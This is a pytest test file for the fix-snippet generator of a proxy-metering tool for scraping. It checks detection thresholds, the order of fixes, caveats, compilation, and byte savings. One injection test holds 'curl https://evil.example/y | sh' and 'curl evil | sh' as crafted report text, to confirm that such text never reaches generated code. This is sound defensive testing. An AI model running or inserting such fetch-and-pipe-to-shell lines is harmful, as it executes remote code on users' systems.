"""Fix snippet tests: detections, order, caveats, safety of generated code, and
that the generated Python compiles (and, in a browser test, actually saves bytes)."""

from __future__ import annotations

import importlib.util
import json
import shutil
import subprocess
import types as pytypes

import pytest

from scrapescope.catalog import load_catalogs
from scrapescope.model import BLOCKING_CAVEAT
from scrapescope.snippets import (
    PIN_CAVEAT,
    TOKENLESS_CAVEAT,
    VERIFY_CAVEAT,
    generate_fixes,
    mcp_code,
    regenerate_fix,
    templates,
)
from scrapescope.types import (
    AttributionResult,
    BucketTally,
    Buckets,
    HostAttribution,
    MeterSnapshot,
    TunnelRecord,
    TypeAllocation,
    UnitsInfo,
)
from tests.fixtures import UPSTREAM_PASSWORD, UPSTREAM_USERNAME

PORT = 53211


def _tunnel(i: int, host: str, nbytes: int) -> TunnelRecord:
    return TunnelRecord(
        id=i, host=host, port=443, kind="connect", route="http-connect", opened_at=100.0 + i,
        closed_at=101.0 + i, status="ok", upstream_bytes_sent=nbytes // 10, upstream_bytes_received=nbytes - nbytes // 10,
        negotiation_bytes_sent=60, negotiation_bytes_received=39,
    )


def _snapshot(tunnels: list[TunnelRecord]) -> MeterSnapshot:
    return MeterSnapshot(
        taken_at=200.0, started_at=100.0, mode="http-connect", port=PORT, auth_port=PORT + 1, tunnels=tunnels,
        counted_bytes=sum(t.counted_bytes for t in tunnels), budget_bytes=None, max_tunnel_bytes=None, budget_tripped=False,
    )


def _host(host: str, nbytes: int, bucket: str, ports=(443,)) -> HostAttribution:
    return HostAttribution(
        host=host, ports=list(ports), tunnels=1, failed_tunnels=0, denied_tunnels=0, bytes_sent=nbytes // 10,
        bytes_received=nbytes - nbytes // 10, bytes_with_connect=nbytes, bytes_without_connect=nbytes - 99, requests=0,
        buckets={bucket: BucketTally(tunnels=1, bytes=nbytes)},
        background_id=bucket.split(":", 1)[1] if bucket.startswith("background:") else None,
    )


def _browser_run(image_bytes: int = 4_000_000, other_bytes: int = 6_000_000, background: int = 0, multi_page: bool = False):
    tunnels = [_tunnel(1, "origin-a.test", other_bytes + image_bytes)]
    hosts = [_host("origin-a.test", other_bytes + image_bytes, "attributed")]
    buckets = Buckets(attributed=other_bytes + image_bytes)
    if background:
        tunnels.append(_tunnel(2, "optimizationguide-pa.googleapis.com", background))
        hosts.append(_host("optimizationguide-pa.googleapis.com", background, "background:optimization-guide"))
        buckets.background["optimization-guide"] = background
    attribution = AttributionResult(
        hosts=hosts,
        types=[
            TypeAllocation(type="document", requests=10, reported_bytes=other_bytes, allocated_bytes=other_bytes),
            TypeAllocation(type="image", requests=30, reported_bytes=image_bytes, allocated_bytes=image_bytes),
        ],
        buckets=buckets,
        units=UnitsInfo(count=10, source="navigations", low_sample_warning=True),
        multi_page_context=multi_page,
        sources=["playwright"],
    )
    snapshot = _snapshot(tunnels)
    # Keep the synthetic run coherent: buckets add up to the with-CONNECT total.
    assert sum(t.bytes_with_connect for t in tunnels) == other_bytes + image_bytes + background
    return attribution, snapshot


def _hook_run(sources: list[str], units: int = 20, tunnels: int = 20) -> tuple[AttributionResult, MeterSnapshot]:
    tlist = [_tunnel(i, "api.origin-a.test", 9000) for i in range(tunnels)]
    attribution = AttributionResult(
        hosts=[_host("api.origin-a.test", 9000 * tunnels, "attributed")],
        buckets=Buckets(attributed=9000 * tunnels),
        units=UnitsInfo(count=units, source="requests", low_sample_warning=units < 20),
        sources=sources,
    )
    return attribution, _snapshot(tlist)


def _ids(fixes) -> list[str]:
    return [f.id for f in fixes]


# ---------------------------------------------------------------------------- detections and order


def test_all_fixes_in_contract_order() -> None:
    attribution, snapshot = _browser_run(background=1_500_000)
    attribution.sources = ["httpx", "playwright", "requests"]
    hook_attr, hook_snap = _hook_run(["httpx", "requests"])
    # Combine: units from hooks, bytes from the browser run.
    attribution.units = hook_attr.units
    snapshot.tunnels += hook_snap.tunnels
    fixes = generate_fixes(attribution, snapshot, load_catalogs())
    assert _ids(fixes) == [
        "playwright-cdp-block",
        "playwright-route-block",
        "chromium-background-flags",
        "playwright-mcp-flags",
        "requests-session-reuse",
        "httpx-client-reuse",
    ]


def test_blocking_fixes_fire_at_ten_percent() -> None:
    attribution, snapshot = _browser_run(image_bytes=1_000_000, other_bytes=9_000_000)
    fixes = generate_fixes(attribution, snapshot, load_catalogs())
    assert _ids(fixes) == ["playwright-cdp-block", "playwright-route-block"]
    assert fixes[0].detection.startswith("images, media and fonts were 10% of the run's bytes")
    assert "1.00 MB allocated of 10.00 MB" in fixes[0].detection


def test_blocking_fixes_do_not_fire_below_ten_percent() -> None:
    attribution, snapshot = _browser_run(image_bytes=999_000, other_bytes=9_001_000)
    assert generate_fixes(attribution, snapshot, load_catalogs()) == []


def test_blocking_fixes_need_playwright_events() -> None:
    attribution, snapshot = _browser_run()
    attribution.sources = ["requests"]
    assert "playwright-cdp-block" not in _ids(generate_fixes(attribution, snapshot, load_catalogs()))


def test_detection_uses_gib_when_asked() -> None:
    attribution, snapshot = _browser_run()
    fix = generate_fixes(attribution, snapshot, load_catalogs(), gb_unit="GiB")[0]
    assert "MiB" in fix.detection


def test_background_fixes_fire_on_background_bytes_only() -> None:
    attribution, snapshot = _browser_run(image_bytes=0, background=1_500_000)
    fixes = generate_fixes(attribution, snapshot, load_catalogs())
    assert _ids(fixes) == ["chromium-background-flags", "playwright-mcp-flags"]
    assert fixes[0].detection == "1.50 MB went to catalogued background hosts (optimization-guide)"
    attribution.buckets.background = {}
    assert generate_fixes(attribution, snapshot, load_catalogs()) == []


def test_mcp_fix_refuses_background_hosts_at_a_meter_not_with_blocked_origins() -> None:
    # data-3: --blocked-origins is Playwright routing (page and worker requests only; disables the cache).
    attribution, snapshot = _browser_run(image_bytes=0, background=1_500_000)
    attribution.hosts.append(_host("clients2.google.com", 3000, "background:extension-updater", ports=(80, 443)))
    attribution.buckets.background["extension-updater"] = 3000
    mcp = next(f for f in generate_fixes(attribution, snapshot, load_catalogs()) if f.id == "playwright-mcp-flags")
    assert mcp.language == "shell"
    assert '--proxy-server "$SCRAPESCOPE_PROXY_URL"' in mcp.code
    assert '--blocked-origins "' not in mcp.code and "--blocked-origins does not replace it" in mcp.code
    assert "seen in this run: optimizationguide-pa.googleapis.com, clients2.google.com\n" in mcp.code
    assert "--user-data-dir ./mcp-profile" in mcp.code
    assert "meter" in mcp.title and "blocked-origins" not in mcp.title


def test_mcp_fix_keeps_the_tokenless_listener_per_run_budgeted_and_pinned() -> None:
    """sec2-4 / honest-3: no standing `serve --allow-tokenless` on a fixed port in the background.

    The MCP server runs under `scrapescope run --budget`: the credential-free listener exists only
    while the server runs, on a random port, with a spending limit, as the plan requires.
    """
    attribution, snapshot = _browser_run(image_bytes=0, background=1_500_000)
    mcp = next(f for f in generate_fixes(attribution, snapshot, load_catalogs()) if f.id == "playwright-mcp-flags")
    commands = [line for line in mcp.code.splitlines() if line and not line.startswith("#")]
    assert commands[0] == "scrapescope run --budget 2GB --deny-catalog background --quiet -- \\"
    assert commands[1].startswith("  sh -c 'exec npx -y @playwright/mcp@X.Y.Z ")
    for banned in ("scrapescope serve", "--allow-tokenless", "--port", "@latest", "127.0.0.1", "&"):
        assert banned not in "\n".join(commands), banned
    assert "replace X.Y.Z" in mcp.code and "without a token" in mcp.code
    assert mcp.title.startswith("If you use Playwright MCP:")
    assert mcp.caveats[:2] == [TOKENLESS_CAVEAT, PIN_CAVEAT] and "--budget" in TOKENLESS_CAVEAT
    assert mcp.caveats[-1] == VERIFY_CAVEAT


def test_background_code_is_playwright_python_only_for_playwright_runs() -> None:
    """docs-5: a Selenium, Puppeteer or plain-CDP run gets the stack-independent part, not Playwright code."""
    attribution, snapshot = _browser_run(image_bytes=0, background=1_500_000)
    attribution.sources = []
    fixes = {f.id: f for f in generate_fixes(attribution, snapshot, load_catalogs())}
    background = fixes["chromium-background-flags"]
    assert background.language == "shell"
    assert "scrapescope run --deny-catalog background -- python job.py" in background.code
    assert "launch_persistent_context" not in background.code and "import" not in background.code
    assert "seen in this run: optimizationguide-pa.googleapis.com" in background.code
    # The MCP fix still appears (an MCP-driven browser writes no helper events) and says when it applies.
    assert fixes["playwright-mcp-flags"].title.startswith("If you use Playwright MCP")
    attribution.sources = ["playwright"]
    playwright = next(f for f in generate_fixes(attribution, snapshot, load_catalogs()) if f.id == background.id)
    assert playwright.language == "python" and "launch_persistent_context(USER_DATA_DIR" in playwright.code


def test_regenerated_fixes_follow_the_report_and_carry_every_unconditional_caveat() -> None:
    from scrapescope.report import build_report
    from scrapescope.types import ReportOptions

    attribution, snapshot = _browser_run(image_bytes=0, background=1_500_000)
    report = json.loads(json.dumps(build_report(snapshot=snapshot, attribution=attribution,
                                                catalogs=load_catalogs(), options=ReportOptions(command="run"))))
    stored = {f["id"]: f for f in report["fixes"]}
    # A report written by an older version: the MCP fix without its tokenless and pinning caveats.
    old_mcp = dict(stored["playwright-mcp-flags"], caveats=[VERIFY_CAVEAT])
    rebuilt = regenerate_fix(old_mcp, report, load_catalogs())
    assert rebuilt is not None and rebuilt.caveats[:2] == [TOKENLESS_CAVEAT, PIN_CAVEAT]
    assert rebuilt.code == mcp_code(["optimizationguide-pa.googleapis.com"])
    background = regenerate_fix(stored["chromium-background-flags"], report, load_catalogs())
    assert background is not None and background.language == "python"
    report["types"] = []  # no browser request types: not a Playwright helper run
    background = regenerate_fix(stored["chromium-background-flags"], report, load_catalogs())
    assert background is not None and background.language == "shell" and "import" not in background.code


def test_background_fix_leads_with_meter_side_refusal_and_stays_metered() -> None:
    # data-2: Playwright already passes the switches, and NodeMaven saw the download with both in force.
    attribution, snapshot = _browser_run(image_bytes=0, background=1_500_000)
    fix = generate_fixes(attribution, snapshot, load_catalogs())[0]
    assert fix.id == "chromium-background-flags"
    assert fix.title.startswith("Refuse catalogued background hosts at the meter")
    code = fix.code
    assert code.index("--deny-catalog background") < code.index("Launch switches are not the fix")
    assert "--deny-host optimizationguide-pa.googleapis.com" in code
    assert "Playwright already passes" in code and "BACKGROUND_ARGS" not in code
    assert 'options.setdefault("proxy", proxy_settings())' in code and "return instrument(context)" in code
    assert "launch_persistent_context(USER_DATA_DIR" in code
    assert "Catalogued background hosts seen in this run: optimizationguide-pa.googleapis.com" in code
    assert any("certificate-revocation and Safe Browsing" in c for c in fix.caveats)
    assert any("Playwright already passes" in c for c in fix.caveats)


def test_suggested_scrapescope_command_lines_parse() -> None:
    from scrapescope.cli import build_parser

    parser = build_parser()
    ns = parser.parse_args(["run", "--budget", "2GB", "--deny-catalog", "background", "--quiet", "--direct", "--",
                            "sh", "-c", "exec npx -y @playwright/mcp@X.Y.Z"])
    assert ns.deny_catalogs == ["background"] and ns.quiet
    ns = parser.parse_args(["run", "--deny-host", "optimizationguide-pa.googleapis.com", "--deny-catalog",
                            "background", "--direct"])
    assert ns.deny_catalogs == ["background"]


def test_background_fix_launches_a_metered_instrumented_persistent_context(monkeypatch) -> None:
    from scrapescope.attribution import read_events
    from scrapescope.config import ENV_EVENTS, ENV_PROXY_URL, PrivateEventsFile
    from scrapescope.helpers import events as ev
    from scrapescope.types import AttachEvent, LaunchEvent

    if importlib.util.find_spec("playwright") is None:
        pytest.skip("playwright not installed")
    attribution, snapshot = _browser_run(image_bytes=0, background=1_500_000)
    module = _exec_module(generate_fixes(attribution, snapshot, load_catalogs())[0].code)
    private = PrivateEventsFile.create()
    ev._reset_for_tests()
    try:
        monkeypatch.setenv(ENV_EVENTS, str(private.path))
        monkeypatch.setenv(ENV_PROXY_URL, "http://127.0.0.1:40001")
        seen: dict = {}

        class Ctx:
            browser = None
            pages: list = []

            def on(self, *_args) -> None:
                pass

        class Chromium:
            def launch_persistent_context(self, user_data_dir, **options):
                seen.update(options, user_data_dir=user_data_dir)
                return Ctx()

        context = module.launch_context(pytypes.SimpleNamespace(chromium=Chromium()))
        assert seen["proxy"] == {"server": "http://127.0.0.1:40001"} and seen["user_data_dir"] == "./chromium-profile"
        assert getattr(context, "_scrapescope_state", None) is not None
        kinds = [type(e) for e in read_events(private.path).events]
        assert kinds.count(AttachEvent) == 1 and kinds.count(LaunchEvent) == 1
    finally:
        ev._reset_for_tests()
        private.cleanup()


def test_reuse_fixes_thresholds() -> None:
    cats = load_catalogs()
    assert _ids(generate_fixes(*_hook_run(["requests"]), cats)) == ["requests-session-reuse"]
    assert _ids(generate_fixes(*_hook_run(["httpx"]), cats)) == ["httpx-client-reuse"]
    assert generate_fixes(*_hook_run(["requests"], units=9, tunnels=9), cats) == []
    assert _ids(generate_fixes(*_hook_run(["requests"], units=10, tunnels=5), cats)) == ["requests-session-reuse"]
    assert generate_fixes(*_hook_run(["requests"], units=10, tunnels=4), cats) == []
    attribution, snapshot = _hook_run(["requests"])
    attribution.units = UnitsInfo(count=20, source="navigations", low_sample_warning=False)
    assert generate_fixes(attribution, snapshot, cats) == []


def test_reuse_fix_counts_upstream_connections_not_continued_records() -> None:
    """meas3-3: a keep-alive plain-HTTP session that alternates hosts through an HTTP CONNECT provider
    keeps one provider connection; the meter starts a new record per host switch (``continued_from``),
    which must not read as "a new tunnel per request"."""
    cats = load_catalogs()
    attribution, snapshot = _hook_run(["requests"], units=20, tunnels=20)
    for i, t in enumerate(snapshot.tunnels):
        t.kind, t.port = "http", 80
        t.host = "origin-a.test" if i % 2 == 0 else "origin-b.test"
        t.continued_from = None if i == 0 else i - 1
    assert sum(t.opened_connection for t in snapshot.tunnels) == 1
    assert generate_fixes(attribution, snapshot, cats) == []
    # The same records, each on a new connection, still fire the fix.
    for t in snapshot.tunnels:
        t.continued_from = None
    assert _ids(generate_fixes(attribution, snapshot, cats)) == ["requests-session-reuse"]


def test_reuse_detection_text() -> None:
    fix = generate_fixes(*_hook_run(["requests"], units=20, tunnels=20), load_catalogs())[0]
    assert fix.detection == "20 new tunnels for 20 hook-counted requests (1.00 per request)"
    assert fix.detection in fix.code
    assert "requests.Session()" in fix.code


@pytest.mark.parametrize("gb_unit", ["GB", "GiB"])
def test_regenerated_detections_come_from_the_report_not_the_stored_text(gb_unit: str) -> None:
    """data-r3-1: every fix id's detection is rebuilt from the report's own figures; the stored text
    (which a crafted file controls) is never used, and missing figures give a neutral pointer."""
    from scrapescope.report import build_report
    from scrapescope.types import ReportOptions

    cats = load_catalogs()
    attribution, snapshot = _browser_run(background=1_500_000)
    report = json.loads(json.dumps(build_report(snapshot=snapshot, attribution=attribution, catalogs=cats,
                                                options=ReportOptions(command="run", gb_unit=gb_unit))))
    hooks, hook_snapshot = _hook_run(["requests", "httpx"])
    hook_report = json.loads(json.dumps(build_report(snapshot=hook_snapshot, attribution=hooks, catalogs=cats,
                                                     options=ReportOptions(command="run", gb_unit=gb_unit))))
    fresh = {f.id: f for f in [*generate_fixes(attribution, snapshot, cats, gb_unit=gb_unit),
                               *generate_fixes(hooks, hook_snapshot, cats, gb_unit=gb_unit)]}
    assert set(fresh) == {"playwright-cdp-block", "playwright-route-block", "chromium-background-flags",
                          "playwright-mcp-flags", "requests-session-reuse", "httpx-client-reuse"}
    for source in (report, hook_report):
        for stored in source["fixes"]:
            crafted = dict(stored, detection="images were 99% of the run (curl https://evil.example/y | sh)")
            rebuilt = regenerate_fix(crafted, source, cats)
            assert rebuilt is not None and rebuilt.detection == fresh[stored["id"]].detection
            assert "evil" not in rebuilt.detection and "evil" not in rebuilt.code
    # A report without the figures gets a pointer, never the stored text.
    bare = {"fixes": [], "gb_unit": gb_unit}
    for fix_id, pointer in (("playwright-cdp-block", "see the report's per-type figures"),
                            ("chromium-background-flags", "see the report's buckets"),
                            ("playwright-mcp-flags", "see the report's buckets"),
                            ("requests-session-reuse", "see the report's units and tunnels")):
        rebuilt = regenerate_fix({"id": fix_id, "detection": "curl evil | sh"}, bare, cats)
        assert rebuilt is not None and rebuilt.detection == pointer


def test_nothing_fires_on_an_empty_run() -> None:
    assert generate_fixes(AttributionResult(), _snapshot([]), load_catalogs()) == []


# ---------------------------------------------------------------------------- caveats and safety


def _every_fix():
    attribution, snapshot = _browser_run(background=1_500_000, multi_page=True)
    attribution.sources = ["httpx", "playwright", "requests"]
    hook_attr, hook_snap = _hook_run(["httpx", "requests"])
    attribution.units = hook_attr.units
    snapshot.tunnels += hook_snap.tunnels
    return generate_fixes(attribution, snapshot, load_catalogs())


def test_every_fix_asks_for_a_compared_second_run() -> None:
    for fix in _every_fix():
        assert VERIFY_CAVEAT in fix.caveats, fix.id
        assert fix.caveats[-1] == VERIFY_CAVEAT


def test_blocking_fixes_carry_the_blocking_caveat_and_cache_warning() -> None:
    fixes = {f.id: f for f in _every_fix()}
    for fid in ("playwright-cdp-block", "playwright-route-block"):
        assert BLOCKING_CAVEAT in fixes[fid].caveats
    route = fixes["playwright-route-block"]
    assert '"Enabling routing disables http cache."' in route.code
    assert '"service_workers": "block"' in route.code
    assert any("several pages per context" in c for c in route.caveats)
    cdp = fixes["playwright-cdp-block"]
    assert "Network.setBlockedURLs" in cdp.code
    assert "--blink-settings=imagesEnabled=false" in cdp.code
    assert "new_cdp_session(page)" in cdp.code


ALLOWED_URL_PREFIXES = (
    "https://chromedevtools.github.io/devtools-protocol/",
    "https://example.com/",
    "https://optimizationguide-pa.googleapis.com",
)


def test_generated_code_has_no_user_data() -> None:
    import re

    for fix in _every_fix():
        # Target hosts, credentials and header names never reach generated code.
        for forbidden in ("origin-a.test", UPSTREAM_USERNAME, UPSTREAM_PASSWORD, "Proxy-Authorization"):
            assert forbidden not in fix.code, (fix.id, forbidden)
        assert fix.code.isascii()
        # The only URLs are documentation, the placeholder page, the meter and catalogued hosts.
        for url in re.findall(r"[a-z]+://[^\s\"';]+", fix.code):
            assert url.startswith(ALLOWED_URL_PREFIXES), (fix.id, url)


def test_fixes_fit_the_report_schema_text_rules() -> None:
    for fix in _every_fix():
        assert len(fix.code) <= 8000
        assert len(fix.title) <= 500 and len(fix.detection) <= 500
        assert all(len(c) <= 500 for c in fix.caveats)
        assert fix.language in ("python", "shell")


# ---------------------------------------------------------------------------- the code compiles


PYTHON_TEMPLATES = {
    "cdp": templates.PLAYWRIGHT_CDP_BLOCK,
    "route": templates.PLAYWRIGHT_ROUTE_BLOCK,
    "flags": templates.CHROMIUM_BACKGROUND_FLAGS,
    "requests": templates.REQUESTS_SESSION_REUSE,
    "httpx": templates.HTTPX_CLIENT_REUSE,
}


def test_every_generated_python_fix_compiles() -> None:
    python = [f for f in _every_fix() if f.language == "python"]
    assert len(python) == 5
    for fix in python:
        compile(fix.code, f"<fix {fix.id}>", "exec")


@pytest.mark.parametrize("name", sorted(PYTHON_TEMPLATES))
def test_templates_compile(name: str) -> None:
    compile(PYTHON_TEMPLATES[name], f"<template {name}>", "exec")


def _exec_module(code: str) -> pytypes.ModuleType:
    module = pytypes.ModuleType("scrapescope_fix_under_test")
    exec(compile(code, "<fix>", "exec"), module.__dict__)  # __name__ != "__main__": nothing launches
    return module


def test_python_fixes_import_without_side_effects() -> None:
    fixes = {f.id: f for f in _every_fix()}
    if importlib.util.find_spec("playwright") is not None:
        cdp = _exec_module(fixes["playwright-cdp-block"].code)
        assert callable(cdp.block_fonts_and_media) and cdp.LAUNCH_ARGS == ["--blink-settings=imagesEnabled=false"]
        route = _exec_module(fixes["playwright-route-block"].code)
        assert route.BLOCKED_RESOURCE_TYPES == {"image", "media", "font"}
        flags = _exec_module(fixes["chromium-background-flags"].code)
        assert flags.USER_DATA_DIR == "./chromium-profile" and callable(flags.launch_context)
    req = _exec_module(fixes["requests-session-reuse"].code)
    assert req.session.__class__.__name__ == "Session"
    hx = _exec_module(fixes["httpx-client-reuse"].code)
    try:
        assert hx.client.__class__.__name__ == "Client"
    finally:
        hx.client.close()
        req.session.close()


def test_route_fix_logic_with_a_fake_route() -> None:
    route_mod = _exec_module(templates.PLAYWRIGHT_ROUTE_BLOCK) if importlib.util.find_spec("playwright") else None
    if route_mod is None:
        pytest.skip("playwright not installed")

    class FakeRoute:
        def __init__(self, rtype: str) -> None:
            self.request = pytypes.SimpleNamespace(resource_type=rtype)
            self.action = None

        def abort(self) -> None:
            self.action = "abort"

        def continue_(self) -> None:
            self.action = "continue"

    for rtype, expected in (("image", "abort"), ("font", "abort"), ("media", "abort"), ("document", "continue"), ("xhr", "continue")):
        r = FakeRoute(rtype)
        route_mod.block_heavy_resources(r)
        assert r.action == expected


@pytest.mark.skipif(shutil.which("bash") is None, reason="bash not available")
def test_mcp_shell_snippet_parses() -> None:
    mcp = next(f for f in _every_fix() if f.id == "playwright-mcp-flags")
    result = subprocess.run(["bash", "-n"], input=mcp.code, text=True, capture_output=True, timeout=10)
    assert result.returncode == 0, result.stderr
    stack_independent = templates.CHROMIUM_BACKGROUND_REFUSE.replace("{hosts}", "optimizationguide-pa.googleapis.com")
    result = subprocess.run(["bash", "-n"], input=stack_independent, text=True, capture_output=True, timeout=10)
    assert result.returncode == 0, result.stderr


# ---------------------------------------------------------------------------- browser: the fix saves bytes


def _load_pages(p, world, *, launch_extra=(), context_kwargs=None, per_page=None, pages=("/", "/product/2")) -> None:
    from tests.fixtures.browser import CONTEXT_KWARGS, PAGE_DONE_PREDICATE, chromium_launch_kwargs

    kwargs = chromium_launch_kwargs(world, server=world.http_upstream_noauth.server, extra_args=tuple(launch_extra))
    browser = p.chromium.launch(**kwargs)
    try:
        context = browser.new_context(**{**CONTEXT_KWARGS, **(context_kwargs or {})})
        if per_page is not None:
            per_page(context)
        page = context.new_page()
        if hasattr(per_page, "page_hook"):
            per_page.page_hook(page)
        for path in pages:
            page.goto(f"https://origin-a.test{path}", wait_until="load")
            page.wait_for_function(PAGE_DONE_PREDICATE, timeout=20_000)
        context.close()
    finally:
        browser.close()


def _measure(world, fn) -> tuple[int, list[str]]:
    """Run one phase and return (upstream bytes, origin-a paths).

    A phase is retried once when Chromium reports ERR_PROXY_CONNECTION_FAILED
    before anything was loaded: that transient local failure was seen only when
    other test processes were loading the machine, and it says nothing about
    the fix under test.
    """
    from playwright.sync_api import Error as PlaywrightError

    for attempt in range(2):
        world.reset()
        try:
            fn()
        except PlaywrightError as exc:
            if attempt == 0 and "ERR_PROXY_CONNECTION_FAILED" in str(exc):
                continue
            raise
        break
    world.wait_idle()
    upstream_bytes = sum(r.bytes_from_client + r.bytes_to_client for r in world.http_upstream_noauth.records())
    return upstream_bytes, list(world.origin("origin-a.test", "https").paths())


@pytest.mark.browser
@pytest.mark.timeout(180)
def test_generated_blocking_fixes_save_bytes_through_a_proxy(world) -> None:
    from playwright.sync_api import sync_playwright

    from tests.fixtures import site

    cdp = _exec_module(templates.PLAYWRIGHT_CDP_BLOCK)
    route = _exec_module(templates.PLAYWRIGHT_ROUTE_BLOCK)

    class CdpHook:
        def __call__(self, context) -> None:
            pass

        def page_hook(self, page) -> None:
            cdp.block_fonts_and_media(page)

    def route_hook(context) -> None:
        context.route("**/*", route.block_heavy_resources)

    with sync_playwright() as p:
        baseline, base_paths = _measure(world, lambda: _load_pages(p, world))
        with_cdp, cdp_paths = _measure(world, lambda: _load_pages(p, world, launch_extra=cdp.LAUNCH_ARGS, per_page=CdpHook()))
        with_route, route_paths = _measure(
            world, lambda: _load_pages(p, world, context_kwargs=route.CONTEXT_OPTIONS, per_page=route_hook)
        )

    images = set(site.IMAGES)
    assert images & set(base_paths), "baseline should download the product images"
    assert site.FONT_PATH in base_paths
    for paths in (cdp_paths, route_paths):
        assert not images & set(paths)
        assert site.FONT_PATH not in paths
    image_bytes = sum(len(site.image(path)) for path in images)
    assert with_cdp < baseline - image_bytes // 2, (baseline, with_cdp)
    assert with_route < baseline - image_bytes // 2, (baseline, with_route)
    # The documented cost of route(): no HTTP cache, so the shared stylesheet is fetched per page.
    assert route_paths.count("/static/style.css") > cdp_paths.count("/static/style.css")


# ---------------------------------------------------------------------------- the reuse fixes save connections


def _new_client_per_request(fix_id: str, url: str) -> None:
    """The pattern the reuse fixes replace: a new Session/Client (a new connection) for every request."""
    if fix_id == "requests-session-reuse":
        import requests

        with requests.Session() as session:
            session.get(url, timeout=30).raise_for_status()
    else:
        import httpx

        with httpx.Client(timeout=30.0) as client:
            client.get(url).raise_for_status()


def _phase(world, run) -> tuple[int, int, int]:
    """(meter tunnels, fixture upstream connections, fixture upstream bytes) for one phase through a meter."""
    from tests.test_forwarder_helpers import make_config, running, settle

    world.reset()
    upstream = world.http_upstream_noauth
    with running(make_config(upstream.url)) as fw:
        run(fw.url)
        snapshot = settle(world, fw, timeout=20)
    records = upstream.records()
    return len(snapshot.target_tunnels()), len(records), sum(r.bytes_from_client + r.bytes_to_client for r in records)


@pytest.mark.timeout(120)
@pytest.mark.parametrize("fix_id", ["requests-session-reuse", "httpx-client-reuse"])
def test_generated_reuse_fixes_open_fewer_connections_through_the_meter(world, monkeypatch: pytest.MonkeyPatch,
                                                                        fix_id: str) -> None:
    """data4-1 (plan section 4: fixture-tested fixes): ten GETs through the meter, first with a new
    Session/Client each (the detected pattern), then with the generated fix's ``fetch()``. The fix must
    open fewer upstream connections and move fewer bytes, as its detection line promises."""
    fix = {f.id: f for f in _every_fix()}[fix_id]
    url = "https://origin-a.test/api/product.json"
    # The generated code takes its proxy from HTTPS_PROXY, as the job's own code would.
    monkeypatch.setenv("REQUESTS_CA_BUNDLE", world.ca_pem)
    monkeypatch.setenv("SSL_CERT_FILE", world.ca_pem)

    def baseline(meter_url: str) -> None:
        monkeypatch.setenv("HTTPS_PROXY", meter_url)
        for _ in range(10):
            _new_client_per_request(fix_id, url)

    def with_fix(meter_url: str) -> None:
        monkeypatch.setenv("HTTPS_PROXY", meter_url)
        module = _exec_module(fix.code)  # creates its Session/Client now, with HTTPS_PROXY in place
        shared = getattr(module, "session", None) or module.client
        try:
            for _ in range(10):
                assert module.fetch(url).status_code == 200
        finally:
            shared.close()

    before = _phase(world, baseline)
    after = _phase(world, with_fix)
    assert before[:2] == (10, 10), before  # one CONNECT tunnel per request
    assert after[:2] == (1, 1), after  # one kept-alive connection for all ten
    assert after[2] < before[2] // 2, (before, after)  # nine CONNECT exchanges and TLS handshakes saved
